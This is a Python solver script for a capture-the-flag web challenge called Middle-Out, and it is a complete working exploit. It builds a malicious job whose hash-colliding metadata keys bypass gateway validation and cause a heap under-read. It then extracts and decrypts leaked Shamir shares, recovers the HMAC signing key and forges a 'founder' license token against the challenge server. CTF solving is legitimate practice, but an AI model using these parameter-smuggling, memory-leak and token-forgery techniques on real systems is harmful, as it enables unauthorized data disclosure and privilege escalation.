#!/usr/bin/env python3
"""End-to-end solver for z0d1akCTF 2026 Web/Middle-Out.

The gateway validates metadata fields by their full lowercase names, while the
native worker dispatches fields by a 32-bit FNV-1a fingerprint. Lowercase hash
collisions overwrite the worker's center and radius after gateway validation,
turning a missing lower-bound check into a controlled heap under-read.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import itertools
import json
import re
import struct
import urllib.error
import urllib.request
import zlib
from pathlib import Path
from typing import Any


DEFAULT_BASE_URL = "https://middle-out-7f06f7333e92.chals.z0d1ak.org"
CONTENT_TYPE = "application/x-parabola-job"
FLAG_PATTERN = re.compile(r"zdk\{[^}\r\n]+\}")

# Lowercase FNV-1a collisions accepted as ordinary extension keys by the
# gateway. The native worker treats them as the corresponding singleton.
CENTER_ALIAS = b"iqjnabzn"
RADIUS_ALIAS = b"jytlafdd"


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(value: str) -> bytes:
    return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))


def fnv1a32(data: bytes) -> int:
    value = 0x811C9DC5
    for byte in data:
        value = ((value ^ byte) * 0x01000193) & 0xFFFFFFFF
    return value


def crc32c(data: bytes) -> int:
    value = 0xFFFFFFFF
    for byte in data:
        value ^= byte
        for _ in range(8):
            value = (value >> 1) ^ (0x82F63B78 if value & 1 else 0)
    return value ^ 0xFFFFFFFF


def metadata_field(name: bytes, value: bytes) -> bytes:
    if not name or len(name) > 255 or len(value) > 255:
        raise ValueError("metadata name and value must fit one-byte lengths")
    return (
        bytes((len(name), len(value)))
        + struct.pack(">I", fnv1a32(name))
        + name
        + value
    )


def build_exploit_job() -> bytes:
    payload = b"A" * 1024
    fields = [
        metadata_field(b"label", b"benchmark"),
        metadata_field(b"center", struct.pack(">H", 512)),
        metadata_field(b"radius", struct.pack(">H", 256)),
        metadata_field(b"strategy", b"\x01"),
        metadata_field(CENTER_ALIAS, struct.pack(">H", 0)),
        metadata_field(RADIUS_ALIAS, struct.pack(">H", 1024)),
    ]
    metadata = b"".join(fields)
    body = metadata + payload
    header = (
        b"PPJB"
        + struct.pack("<H", 3)
        + struct.pack(">HII", len(metadata), len(payload), crc32c(body))
    )
    return header + body


def decode_moz1(capsule: bytes) -> bytes:
    if len(capsule) < 20 or capsule[:4] != b"MOZ1":
        raise ValueError("response is not a MOZ1 compression capsule")
    if capsule[4:6] != b"\x01\x01":
        raise ValueError("unsupported MOZ1 version or compression method")

    radius = struct.unpack(">H", capsule[6:8])[0]
    output_length, packed_length, expected_crc = struct.unpack(
        ">III", capsule[8:20]
    )
    if output_length != 2 * radius or len(capsule) != 20 + packed_length:
        raise ValueError("inconsistent MOZ1 lengths")

    packed = capsule[20:]
    middle_order = bytearray()
    cursor = 0
    while cursor < len(packed):
        control = packed[cursor]
        cursor += 1
        if control & 0x80:
            if cursor >= len(packed):
                raise ValueError("truncated MOZ1 run")
            middle_order.extend(packed[cursor : cursor + 1] * ((control & 0x7F) + 3))
            cursor += 1
        else:
            length = control + 1
            if cursor + length > len(packed):
                raise ValueError("truncated MOZ1 literal")
            middle_order.extend(packed[cursor : cursor + length])
            cursor += length

    if len(middle_order) != output_length:
        raise ValueError("MOZ1 decoder produced the wrong length")

    output = bytearray(output_length)
    for index, value in enumerate(middle_order):
        if index == 0:
            destination = radius
        elif index & 1:
            destination = radius - ((index + 1) // 2)
        else:
            destination = radius + index // 2
        output[destination] = value

    if zlib.crc32(output) & 0xFFFFFFFF != expected_crc:
        raise ValueError("MOZ1 output CRC mismatch")
    return bytes(output)


def extract_wsc4_capsules(leak: bytes, build_key: bytes) -> list[bytes]:
    expected_key_crc = zlib.crc32(build_key) & 0xFFFFFFFF
    capsules: list[bytes] = []
    cursor = 0
    while True:
        offset = leak.find(b"WSC4", cursor)
        if offset < 0:
            break
        cursor = offset + 4
        capsule = leak[offset : offset + 48]
        if len(capsule) != 48:
            continue
        if capsule[4] != 1 or capsule[6:8] != b"\x20\x01":
            continue
        if struct.unpack(">I", capsule[8:12])[0] != expected_key_crc:
            continue
        stored_crc = struct.unpack(">I", capsule[44:48])[0]
        if stored_crc != zlib.crc32(capsule[:44]) & 0xFFFFFFFF:
            continue
        if capsule not in capsules:
            capsules.append(capsule)
    return capsules


def decrypt_share(capsule: bytes, build_key: bytes) -> tuple[int, bytes]:
    slot = capsule[5]
    ciphertext = capsule[12:44]
    share = bytes(
        build_key[(slot + index) & 7]
        ^ ((slot * 29 + 99 + 17 * index) & 0xFF)
        ^ value
        for index, value in enumerate(ciphertext)
    )
    return slot, share


def gf256_multiply(left: int, right: int) -> int:
    result = 0
    while right:
        if right & 1:
            result ^= left
        right >>= 1
        left <<= 1
        if left & 0x100:
            left ^= 0x11B
    return result


def gf256_power(value: int, exponent: int) -> int:
    result = 1
    while exponent:
        if exponent & 1:
            result = gf256_multiply(result, value)
        value = gf256_multiply(value, value)
        exponent >>= 1
    return result


def recover_secret(left: tuple[int, bytes], right: tuple[int, bytes]) -> bytes:
    """Interpolate a degree-one GF(2^8) polynomial at x=0."""
    x1, y1 = left
    x2, y2 = right
    if x1 == x2 or len(y1) != len(y2):
        raise ValueError("invalid Shamir share pair")
    denominator_inverse = gf256_power(x1 ^ x2, 254)
    coefficient1 = gf256_multiply(x2, denominator_inverse)
    coefficient2 = gf256_multiply(x1, denominator_inverse)
    return bytes(
        gf256_multiply(a, coefficient1) ^ gf256_multiply(b, coefficient2)
        for a, b in zip(y1, y2)
    )


def verify_hmac_token(secret: bytes, token: str) -> bool:
    try:
        message, encoded_signature = token.split(".")
        signature = b64url_decode(encoded_signature)
    except (ValueError, TypeError):
        return False
    expected = hmac.new(secret, message.encode(), hashlib.sha256).digest()
    return hmac.compare_digest(signature, expected)


def request(
    base_url: str,
    path: str,
    *,
    method: str = "GET",
    body: bytes | None = None,
    content_type: str | None = None,
) -> tuple[int, dict[str, str], bytes]:
    headers = {"User-Agent": "middle-out-solver/1.0"}
    if content_type:
        headers["Content-Type"] = content_type
    req = urllib.request.Request(
        base_url.rstrip("/") + path,
        data=body,
        headers=headers,
        method=method,
    )
    try:
        with urllib.request.urlopen(req, timeout=20) as response:
            return response.status, dict(response.headers), response.read()
    except urllib.error.HTTPError as error:
        return error.code, dict(error.headers), error.read()


def write_json(path: Path, value: Any) -> None:
    path.write_text(json.dumps(value, indent=2, sort_keys=True) + "\n")


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("base_url", nargs="?", default=DEFAULT_BASE_URL)
    parser.add_argument(
        "--artifacts-dir",
        type=Path,
        help="optionally preserve the malicious job, leak, capsules, and responses",
    )
    args = parser.parse_args()
    base_url = args.base_url.rstrip("/")

    status, _, trial_body = request(base_url, "/api/license/trial")
    if status != 200:
        raise RuntimeError(f"trial license request failed: HTTP {status} {trial_body!r}")
    trial = json.loads(trial_body)
    build = trial["build"]
    build_key = bytes.fromhex(build)
    if len(build_key) != 8:
        raise RuntimeError(f"unexpected build key length: {build!r}")

    print(f"[+] build ID: {build}")
    print(
        f"[+] FNV(center)  = FNV({CENTER_ALIAS.decode()}) "
        f"= 0x{fnv1a32(b'center'):08x}"
    )
    print(
        f"[+] FNV(radius)  = FNV({RADIUS_ALIAS.decode()}) "
        f"= 0x{fnv1a32(b'radius'):08x}"
    )

    exploit_job = build_exploit_job()
    all_capsules: list[bytes] = []
    last_response = b""
    last_leak = b""
    for attempt in range(1, 4):
        status, _, response = request(
            base_url,
            "/api/compress",
            method="POST",
            body=exploit_job,
            content_type=CONTENT_TYPE,
        )
        if status != 200:
            raise RuntimeError(f"compression exploit failed: HTTP {status} {response!r}")
        leak = decode_moz1(response)
        capsules = extract_wsc4_capsules(leak[:1024], build_key)
        for capsule in capsules:
            if capsule not in all_capsules:
                all_capsules.append(capsule)
        last_response = response
        last_leak = leak
        print(
            f"[+] leak attempt {attempt}: {len(leak)} bytes, "
            f"{len(capsules)} valid WSC4 capsules"
        )
        if len(all_capsules) >= 4:
            break

    shares = [decrypt_share(capsule, build_key) for capsule in all_capsules]
    if len(shares) < 2:
        raise RuntimeError("the leak did not contain enough WSC4 shares")

    signing_secret = None
    selected_slots: tuple[int, int] | None = None
    for left, right in itertools.combinations(shares, 2):
        candidate = recover_secret(left, right)
        if verify_hmac_token(candidate, trial["token"]):
            signing_secret = candidate
            selected_slots = (left[0], right[0])
            break
    if signing_secret is None or selected_slots is None:
        raise RuntimeError("no share pair reconstructed the trial-token signing key")

    print(f"[+] authentic Shamir shares: slots {selected_slots[0]} and {selected_slots[1]}")
    print(f"[+] recovered HMAC-SHA256 key: {signing_secret.hex()}")

    trial_payload_segment = trial["token"].split(".")[0]
    founder_claims = json.loads(b64url_decode(trial_payload_segment))
    founder_claims["tier"] = "founder"
    founder_payload = b64url_encode(
        json.dumps(founder_claims, separators=(",", ":")).encode()
    )
    founder_signature = hmac.new(
        signing_secret, founder_payload.encode(), hashlib.sha256
    ).digest()
    founder_token = founder_payload + "." + b64url_encode(founder_signature)

    activation_body = json.dumps({"token": founder_token}).encode()
    status, _, activation_response = request(
        base_url,
        trial.get("activate", "/api/license/activate"),
        method="POST",
        body=activation_body,
        content_type="application/json",
    )
    if status != 200:
        raise RuntimeError(
            f"founder activation failed: HTTP {status} {activation_response!r}"
        )
    activation = json.loads(activation_response)
    match = FLAG_PATTERN.search(activation.get("license", ""))
    if not match:
        raise RuntimeError(f"activation response did not contain a flag: {activation!r}")

    if args.artifacts_dir:
        args.artifacts_dir.mkdir(parents=True, exist_ok=True)
        write_json(args.artifacts_dir / "trial-license.json", trial)
        (args.artifacts_dir / "malicious-job.ppjb").write_bytes(exploit_job)
        (args.artifacts_dir / "worker-response.moz").write_bytes(last_response)
        (args.artifacts_dir / "decoded-worker-window.bin").write_bytes(last_leak)
        write_json(
            args.artifacts_dir / "wsc4-shares.json",
            {
                "build_key_hex": build_key.hex(),
                "capsules": [
                    {
                        "slot": slot,
                        "capsule_hex": capsule.hex(),
                        "decrypted_share_hex": share.hex(),
                    }
                    for capsule, (slot, share) in zip(all_capsules, shares)
                ],
                "selected_slots": list(selected_slots),
                "recovered_hmac_key_hex": signing_secret.hex(),
            },
        )
        write_json(args.artifacts_dir / "activation-response.json", activation)

    print(f"[+] founder activation accepted: {activation['tier']}")
    print(match.group(0))


if __name__ == "__main__":
    main()
